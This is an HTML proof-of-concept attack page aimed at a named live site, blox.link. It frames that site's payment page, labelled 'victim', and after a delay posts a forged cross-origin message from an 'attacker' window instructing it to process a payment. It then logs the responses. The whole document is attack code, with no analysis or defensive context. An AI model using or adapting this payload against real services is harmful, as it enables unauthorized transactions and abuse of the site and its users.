<!DOCTYPE html>
<html>
<body>
<iframe src="https://blox.link/payment-page" id="victim"></iframe>
<script>
setTimeout(() => {
    const payload = {
        cbEvent: true,
        targetWindowName: 'cb-iframe', // or check actual window name
        srcWindowName: 'attacker',
        message: {
            action: 'process_payment',
            data: { amount: 0.01 }
        },
        replyId: '123'
    };
    
    document.getElementById('victim').contentWindow.postMessage(
        payload, 
        'https://blox.link'
    );
}, 2000);

// Listen for responses
window.addEventListener('message', (e) => {
    console.log('Response:', e.data);
});
</script>
</body>
</html>
